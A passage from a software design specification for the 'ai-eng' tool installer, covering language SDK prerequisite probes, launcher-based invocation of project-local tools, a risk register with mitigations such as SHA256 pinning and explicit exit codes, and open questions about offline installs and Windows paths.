| kotlin | `java -version` (JDK is the prereq, kotlinc is bundled with kotlin tool) | same |
| swift | `swift --version` (macOS only — also gates D-101-13) | `https://www.swift.org/install/` |
| dart | `dart --version` exit 0 | `https://dart.dev/get-dart` |
| csharp | `dotnet --version` + parse `>= 9` | `https://dotnet.microsoft.com/download` |
| go | `go version` exit 0 | `https://go.dev/dl/` |
| rust | `rustc --version` exit 0 | `https://rustup.rs/` |
| php | `php --version` + parse `>= 8.2` | `https://www.php.net/downloads` |
| cpp | `clang --version` OR `gcc --version` (either OK) | `https://llvm.org/builds/` |

Any failure yields EXIT 81 with a multi-line message naming the stack, the missing SDK, the install link, and the exact command to verify after manual install (`<probe>`).

**Probe-only invariant**: `prereqs/sdk.py` MUST execute the probe command and ONLY the probe command per stack. It MUST NOT shell out to install commands, network downloads, or anything that would attempt SDK installation — NG-11 forbids it. A unit test asserts `prereqs/sdk.py`'s subprocess calls match an allowlist of probe argv shapes (`["java", "-version"]`, `["dotnet", "--version"]`, `["go", "version"]`, etc.) and rejects everything else.

**Rationale**: 9 of 14 stacks need a language SDK before any tool install. Today the installer would run `cargo install cargo-audit` against a machine without `cargo` and crash with a low-level FileNotFoundError. Surfacing this at the prereqs gate produces a single, actionable error instead of a cascade. NG-11 forbids auto-install — the link is the user's path forward, and the probe-only invariant prevents drift into NG-11 territory.

### D-101-15: `scope: project_local` tools are invoked via launcher, not `shutil.which`

Tools declared with `scope: project_local` (tsc, vitest, prettier, eslint for typescript/javascript; phpunit for php; ctest for cpp; etc.) are NOT installed via `user_scope_install` and NOT looked up via `shutil.which`. Instead `stack_runner.py` invokes them through their language-native launcher:

| Stack | Launcher pattern |
|---|---|
| typescript / javascript | `npx <tool> <args>` (resolves to `node_modules/.bin/<tool>` if installed locally, else fails with clear "run `npm install`") |
| php | `./vendor/bin/<tool> <args>` (composer-installed) |
| java | `./mvnw <goal>` or `./gradlew <task>` (project wrapper) |
| kotlin | `./gradlew <task>` |
| cpp | `cmake --build` + `ctest` (project-local CMake) |

The `run_tool_check` function (`stack_runner.py:288`) gains a branch: if `scope == "project_local"`, route through the launcher; if the launcher fails because the dep is not present in the project, the error message names the exact command the user runs to install dev deps (`npm install`, `composer install`, `./mvnw install`).

**Rationale**: project_local tools are part of the user's project, not the framework — installing them globally would conflict with the project's own pinned versions and break reproducibility. Today `shutil.which("tsc")` returns nothing on a fresh clone and the gate reports "tsc not found — required" which is actionable but misleading (the right action is `npm install`, not "install tsc globally"). The launcher pattern is what every linter/formatter ecosystem already uses; matching that convention reduces user surprise.

## Risks

- **R-1 — User's `~/.local/bin` is not on PATH**. *Mitigation*: post-install verification runs `<tool> --version` against the path the installer wrote to; if not on PATH, the installer prints the exact shell-profile snippet to add (`export PATH="$HOME/.local/bin:$PATH"` for bash/zsh; `fish_add_path $HOME/.local/bin` for fish; `$env:Path += ";$HOME\.local\bin"` for PowerShell; detected from the active shell) and exits 80. No auto-edit of shell profiles.
- **R-2 — npm/pnpm/bun missing when node stack is declared**. *Mitigation*: declared as prereq in the prereqs phase; `ai-eng install` fails early with exit 81 and a link to Node.js official installer. Not auto-installed per NG-5.
- **R-3 — `package.json` missing in a project that declares the `node` stack**. *Mitigation*: installer checks for `package.json` before invoking `npm install`; if missing, prints the exact `npm init -y` command and exits 80 (no auto-creation — would change project contents non-idempotently).
- **R-4 — Homebrew not installed on macOS**. *Mitigation*: prereqs phase detects `brew --version`; if absent, exits 81 with link to Homebrew official installer. gitleaks and jq have a fallback GitHub-release binary mechanism that works on macOS too if the user cannot install Homebrew (kept minimal).
- **R-5 — Pinned SHA256 for binary downloads drifts as upstream releases**. *Mitigation*: the pinned SHA list lives in `installer/tool_registry.py` and is refreshed by a scheduled workflow that also updates test fixtures. When a pinned version is unavailable, the installer surfaces the exact mismatch (expected vs received SHA) and exits 80 — never installs an unverified binary.
- **R-6 — Breaking change disrupts existing CI scripts running `ai-eng install || true`**. *Mitigation*: CHANGELOG BREAKING entry; first-run banner; grep-able exit code 80 per D-101-11 so CI can distinguish from other exit-1 cases; migration section in docs detailing the `|| true` removal.
- **R-7 — Existing user has `gitleaks` at `~/.local/bin/gitleaks` at the wrong version or from a prior install**. *Mitigation*: verify-command regex also captures the version string; when a version mismatch is detected, installer reports "version mismatch (found X, expected Y)" and requires `--force` to overwrite; never silently overwrites.
- **R-8 — `uv tool install` changes its behaviour across uv versions**. *Mitigation*: pin supported `uv` version range in `manifest.yml` (`prereqs.uv.version_range`); CI matrix includes oldest and newest supported uv. Install fails 81 if the active `uv` falls outside the range.
- **R-9 — Windows path separators break shell-profile snippets across cmd/pwsh/gitbash**. *Mitigation*: installer detects active shell (`$PSVersionTable`, `$BASH`, `$SHELL`) and prints the profile snippet matching that shell only.
- **R-10 — Legacy `install-state.json` schema from prior versions is incompatible**. *Mitigation*: on detecting a legacy state file (missing `required_tools_state` key or absent `os_release` field), installer renames it to `install-state.json.legacy-<ISO-ts>`, writes fresh state, logs the migration, and proceeds as a fresh install. Legacy state is preserved read-only for rollback.
- **R-11 — Offline/air-gapped enterprise environments cannot reach release channels**. *Mitigation*: verify paths are offline-safe per D-101-04; `ai-eng install` fails 80 with a clear message naming the unreachable release URL. An actual `--offline` install flow with pre-seeded bundle is tracked as OQ-3 and is explicitly NG-10 for this spec.
- **R-12 — Homebrew prefix is not `/opt/homebrew` or `/usr/local`**. *Mitigation*: the allowlist in D-101-02 resolves `$(brew --prefix)` at runtime rather than hardcoding a path, accommodating custom installs and `$HOMEBREW_PREFIX` overrides.
- **R-13 — SDK prereq cascade across 9 stacks**. *Mitigation*: D-101-14 prereq gate exits 81 with actionable installer link before any tool install runs. SDK install itself is NG-11. CI matrix uses pre-installed SDKs in runner images so install-smoke jobs don't fail on missing JDK/Go/Rust/etc.
- **R-14 — Worktree-induced full venv re-install kills productivity**. *Mitigation*: `python_env.mode=uv-tool` default per D-101-12 eliminates project venv entirely for Python tools; G-12 verifies second-worktree-add + commit < 30s. Users who require a project venv opt in via `mode=venv` or `mode=shared-parent`. Migration documented in CHANGELOG.
- **R-15 — `manifest.stacks` declares a stack without matching gate checks (silent no-op)**. *Mitigation*: per D-101-01, `stack_runner.py` `PRE_COMMIT_CHECKS`/`PRE_PUSH_CHECKS` registry becomes data-driven from manifest, so adding a stack to manifest without registered checks is impossible by construction. `ai-eng validate manifest` lint also fails when a declared stack has no `required_tools.<stack>` entry.

## References

- `.ai-engineering/notes/adoption-s2-commit-pr-speed.md` — follow-up spec S2
- `.ai-engineering/notes/adoption-s3-unified-gate-risk-accept.md` — follow-up spec S3
- `.ai-engineering/notes/adoption-s4-skills-consolidation-architecture.md` — follow-up spec S4
- `.ai-engineering/notes/adoption-s5-mcp-sentinel-ide-parity.md` — follow-up spec S5
- Brainstorm 2026-04-24 research Wave 1 Agent A1: installation audit report
- Prior: `spec/047-install-ux-fixes`, `spec/018-env-stability-governance-hardening`
- `sysexits.h` (BSD) — exit code 80 avoids collision with standard 64-78 range
- CLAUDE.md Don't #1-9 (never weaken, never bypass) — S1 does not violate; hard-failing on missing tools is strengthening, not weakening

## Open Questions

- **OQ-1**: When the binary-download fallback is the only option for a tool on Linux (e.g., gitleaks on a distro without a user-level package manager), should the installer also verify a GPG signature in addition to SHA256? Default direction: SHA256 only for now; GPG adds trust-store complexity and every upstream we target publishes SHA256 alongside the release. Revisit if any tool publishes only GPG.
- **OQ-2**: Should `ai-eng doctor --fix` automatically run `ai-eng install` when it detects the install has never completed (no `install-state.json`)? Default direction: no; doctor is repair, install is bootstrap — keep the separation. Print a clear message instead.
- **OQ-3**: A future `--offline` install flow with a pre-seeded binary bundle under `.ai-engineering/bin-cache/` is out of scope (NG-10). Design notes: bundle format, integrity signing, refresh cadence. Tracked for a follow-up spec driven by real enterprise demand.
- **OQ-4**: `$HOMEBREW_PREFIX` custom install paths — currently resolved at runtime via `brew --prefix`. If Homebrew is absent entirely, the fallback is GitHub-release binary download. Is there a case where Homebrew is present but `brew --prefix` fails (dead symlink)? Default: treat as Homebrew-absent and fall through.
- **OQ-5**: On Windows, `~/.local/bin` is not created implicitly. The Linux binary-download mechanism is not used on Windows (WinGet/Scoop exclusively per D-101-02), so the directory is never touched on Windows and no creation logic is needed. Confirm with Windows CI matrix before finalizing implementation.
